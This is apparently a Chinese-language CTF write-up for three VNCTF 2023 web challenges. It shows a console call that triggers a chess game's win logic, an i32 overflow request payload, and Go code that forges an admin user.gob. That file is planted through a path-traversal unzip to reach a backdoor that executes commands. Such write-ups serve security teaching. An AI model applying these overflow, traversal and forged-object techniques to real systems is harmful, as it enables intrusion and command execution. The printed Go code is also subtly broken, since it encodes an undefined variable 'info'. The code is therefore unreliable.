## Web
### 象棋王子
在js源码 play.js中找到赢之后执行的逻辑，直接控制台执行
![](attachments/Pasted%20image%2020230427123520.png)


![](attachments/Pasted%20image%2020230427123350.png)

flag{w3lc0m3_t0_VNCTF_2023~~~}

### 电子木鱼
rust编写的后端，要1亿功德拿flag

![](attachments/Pasted%20image%2020230427124500.png)

这里考虑将cost设置为一个极限的负数，使功德减去它的时候能够转正 
i32的大小是 -2147483648~2147483647，经典的构造极限

没有思考了，在极限那个位置reset了几次
payload `name=Cost&quantity=214748366`

![](attachments/Pasted%20image%2020230427131811.png)

### BabyGo
go语言
一共5个路由
- GET /
- GET /upload
- POST /upload
	- 禁止上传 .gob 和 .go 文件
- GET /unzip
	- 解压文件，文件路径来自与get参数拼接
- GET /backdoor
	- 解码引用user.gob  在 Power为 admin 时 可以通过 goeval.Eval() 来执行命令

>思路：上传压缩文件，解压后覆盖原有user.gob 以此引用 /backdoor来执行命令，由于在调用的时候有decode的操作，我们生成的文件也需要是对应二进制的才能decode

[Go语言二进制文件的读写操作 (biancheng.net)](http://c.biancheng.net/view/4563.html)

```go
package main

import (
    "encoding/gob"
    "fmt"
    "os"
)

type User struct {
    Path string
    Name string
    Power string
}

func main() {
    user := User{Name: "ctfer", Path: "/tmp/d7671aa466b2c69f80e4bc0cf4b6b638/", Power: "admin"}
    file, err := os.Create("./user.gob")
    if err != nil {
        fmt.Println("文件创建失败", err.Error())
        return
    }
    defer file.Close()

    encoder := gob.NewEncoder(file)
    err = encoder.Encode(info)
    if err != nil {
        fmt.Println("编码错误", err.Error())
        return
    } else {
        fmt.Println("编码成功")
    }
}
```

解压时path可控，可以直接目录穿越
path=/../../../../../tmp/d7671aa466b2c69f80e4bc0cf4b6b638/
带着参数访问unzip就可以

![](attachments/Pasted%20image%2020230427135428.png)